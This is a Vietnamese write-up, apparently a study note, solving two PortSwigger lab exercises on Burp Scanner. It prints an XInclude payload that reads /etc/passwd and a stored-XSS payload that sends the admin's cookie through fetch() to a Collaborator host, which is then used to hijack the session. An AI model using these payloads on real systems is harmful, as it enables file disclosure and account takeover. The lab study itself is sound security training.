---
title: 'Web13: Essential skills'
tags: [web13]

---

# **1. Lab: Discovering vulnerabilities quickly with targeted scanning**
>This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.
Due to the tight time limit, we recommend using [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner) to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a [targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.
![image](https://hackmd.io/_uploads/rJiyiRvPC.png)

>Bài lab giới hạn ta 10 phút nên ta không thể tìm lỗ hổng bằng cách thủ công, thay vào đó ta sẽ sử dụng công cụ Scan của Burp! Ta sẽ đi tìm các endpoint khả nghi và scan ngại tại endpoint đó mà không cần tốn công scan cả web.

>Mỗi sản phẩm đều có chức năng Check Stock:
>![image](https://hackmd.io/_uploads/BJQD30vvC.png)

>Đây là endpoint đáng nghi ngờ khi nó send request với input mà ta có thể controll:
>![image](https://hackmd.io/_uploads/Hy99nRDwC.png)

>Chuột phải và chọn Active Scan cho endpoint này:
>![image](https://hackmd.io/_uploads/B1rn2CwvA.png)

>Sau khi đợi khoảng 3 phút thì Burp đã phát hiện 1 lỗi nghiêm trọng trong trang web **Out-of-band**:
>![image](https://hackmd.io/_uploads/BJkbaAPwC.png)

>Nó có thể khiến ứng dụng truy xuất nội dung của một URL bên ngoài tùy ý và trả về những nội dung đó trong phản hồi của chính nó, ta sẽ sử dụng payload mà scan sử dụng để truy xuất nội dung `/etc/passwd`:
>![image](https://hackmd.io/_uploads/rkYda0DwC.png)

>Payload:
>`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
`

>Thay payload vào trong request và send, ta nhận lại được nội dung file cần tìm:
>![image](https://hackmd.io/_uploads/HJWM0CwPC.png)

>Hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/rkb7ARvPR.png)

# **2. Lab: Scanning non-standard data structures**
>This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.
To solve the lab, use [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner)'s **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.
You can log in to your own account with the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/HyO-xkdvC.png)

>Đăng nhập vào `wiener`, tại request `GET /my-account?id=wiener`, ta thấy rằng session được lưu dưới dạng `username-random_token` với phần `username` dạng bản rõ:
>![image](https://hackmd.io/_uploads/r1n9mR_vR.png)

>Từ đó, ta đoán rằng server sẽ có cơ chế xử lí 2 giá trị đầu vào của cookie! Bôi đen phần `wiener`, chuột phải chọn **Scan selected insertion point**, ấn OK:
>![image](https://hackmd.io/_uploads/BkdtHAODC.png)

>Sau khi đợi khoảng 2 phút, sau khi Burp scan xong, ta thu được kết quả lab này dính lỗi Store XSS:
>![image](https://hackmd.io/_uploads/BJOkL0dP0.png)

>Ta sẽ tận dụng payload mà Burp phát hiện lỗi, gửi sang Repeater để khai thác tiếp:
>![image](https://hackmd.io/_uploads/BJK4IRODC.png)

>Ta sẽ sử dụng kĩ thuật Out-of-band sử dụng Collab để đọc được dữ liệu trả về từ server, payload:
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

>Send request:
>![image](https://hackmd.io/_uploads/rJivPRuwR.png)

>Từ Collab, ta nhận được các request DNS và HTTPS:
>![image](https://hackmd.io/_uploads/H1OtwC_P0.png)

>Kết quả, do đã lưu trữ payload StoreXSS nên khi admin truy cập vào trang web đã bị dính XSS và ta nhận được cookie:
>![image](https://hackmd.io/_uploads/r1SfuAuvR.png)

>Có được session của admin, ta thay cookie vào trong session bằng cách mở DevTools:
>![image](https://hackmd.io/_uploads/ryZYFCOwA.png)

>Thành công truy cập được vào trang quản trị:
>![image](https://hackmd.io/_uploads/r1IqFAOvC.png)

>Xóa `carlos` và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/SJ0oFROvR.png)
